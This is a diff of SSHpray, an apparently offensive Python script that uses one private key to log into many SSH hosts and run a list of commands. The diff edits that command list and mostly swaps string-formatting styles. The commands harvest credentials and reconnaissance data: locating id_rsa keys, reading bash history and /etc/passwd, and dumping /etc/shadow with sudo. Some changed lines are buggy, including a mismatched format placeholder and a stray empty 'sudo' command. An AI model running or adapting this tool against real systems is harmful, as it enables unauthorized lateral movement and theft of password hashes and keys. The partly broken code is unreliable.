@@ -23,7 +23,7 @@ class SSHpray():
 		self.timeout = int(5)
 
 		#command(s) to run
-		self.remote_commands = ['locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
+		self.remote_commands = ['sudo locate id_rsa', 'sudo ','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
 
 	def check_args(self, parser):
 
@@ -37,7 +37,7 @@ class SSHpray():
 
 		#if a file is supplied and no ip is supplied, open it with read_targets
 		if self.args.targets is not None:
-			print('[i] Opening targets file: %s' % self.args.targets)
+			print('[i] Opening targets file: {}'.format(self.args.targets))
 			self.targetsFile = self.args.targets
 			self.read_targets()
 		else:
@@ -74,7 +74,7 @@ class SSHpray():
 			#if the ip isnt valid
 			except socket.error:
 				#tell them
-				print ('[!] Invalid IP address [ %s ] found on line %s... Fixing!' %  (t,i+1))
+				print ('[!] Invalid IP address [ {} ] found on line {}... Fixing!'.format(t,i+1))
 				#fix the entries. this function will add resolved IPs to the targetSet
 				self.fix_targets(t)
 			except Exception as e:
@@ -85,7 +85,7 @@ class SSHpray():
 		#only allow IP addresses--if it isnt'
 		if not ipAddrRegex.match(t):
 			#remove from targetList
-			if self.args.verbose is True:print('[v] Removing invalid IP %s'% t)
+			if self.args.verbose is True:print('[v] Removing invalid IP {}'% t)
 			self.targetList.remove(t)
 		else:
 			#otherwise add to target set
@@ -103,15 +103,15 @@ class SSHpray():
 		if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', t):
 			parsed_uri = urlparse(t)
 			domain = '{uri.netloc}'.format(uri=parsed_uri)
-			if self.args.verbose is True:print('[i] Looking up IP for %s' % domain)
+			if self.args.verbose is True:print('[i] Looking up IP for {}'.format(domain))
 			hostDomainCmd = subprocess.Popen(['dig', '+short', domain], stdout = PIPE)
-			#print('[i] IP address for %s found: %s' % (t,hostDomainCmd.stdout.read().strip('\n')))
+			#print('[i] IP address for {} found: {}'.format(t,hostDomainCmd.stdout.read().strip('\n')))
 			#for each line in the host commands output, add to a fixed target list
 			self.targetSet.add(hostDomainCmd.stdout.read().strip('\n')) 
 		
 		#filter hostnames
 		else:
-			if self.args.verbose is True:print('[i] Looking up IP for hostname %s' % t)
+			if self.args.verbose is True:print('[i] Looking up IP for hostname {}'.format(t))
 			#just resolve ip from hostname if no http:// or https:// in the entry
 			hostNameCmd = subprocess.Popen(['dig', '+short', t], stdout = PIPE)
 			self.targetSet.add(hostNameCmd.stdout.read().strip('\n'))
@@ -122,30 +122,30 @@ class SSHpray():
 	
 	def cls(self):
 		os.system('cls' if os.name == 'nt' else 'clear')
-		print('SSHpray started at: %s' % (time.strftime("%d/%m/%Y - %H:%M:%S")))
+		print('SSHpray started at: {}'.format(time.strftime("%d/%m/%Y - %H:%M:%S")))
 	
 	def connect(self):
 		signal.signal(signal.SIGINT, self.signal_handler)
 		with open(self.args.keyfile) as f:
 			private_key = f.readlines()
-		print('[i] Using Private Key: %s ' % self.args.keyfile)
+		print('[i] Using Private Key: {} '.format(self.args.keyfile))
 		for i, t in enumerate(self.targetSet):
-			if self.args.verbose is True: print ("[+] Attempting to SSH to %s" % (t) )
+			if self.args.verbose is True: print ("[+] Attempting to SSH to {}".format(t) )
 			try:#Initialize SSH session to host via paramiko and run the command contents
 				ssh = paramiko.SSHClient()
 				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 				ssh.connect(t, username = self.args.username, key_filename = self.args.keyfile, timeout=self.timeout)
 				for c in self.remote_commands:
-					#print('Running %s' % c)
+					#print('Running {}'.formatc)
 					stdin, stdout, stderr = ssh.exec_command(c)
 					#server response not working for some reason
-					print ("[+] %s responded to %s with: \n" % (t,c))
+					print ("[+] {} responded to {} with: \n".format(t,c))
 					print (''.join(stdout.readlines()))
 					print('\n')
 				ssh.close()
-				print ('[+] SSH Session to %s closed' % (t))
+				print ('[+] SSH Session to {} closed'.format(t))
 			except Exception as e:
-				print("[!] %-15s : %s" % (t,e))
+				print("[!] {:15} : {}".format(t,e))
 				pass
 
 def main():
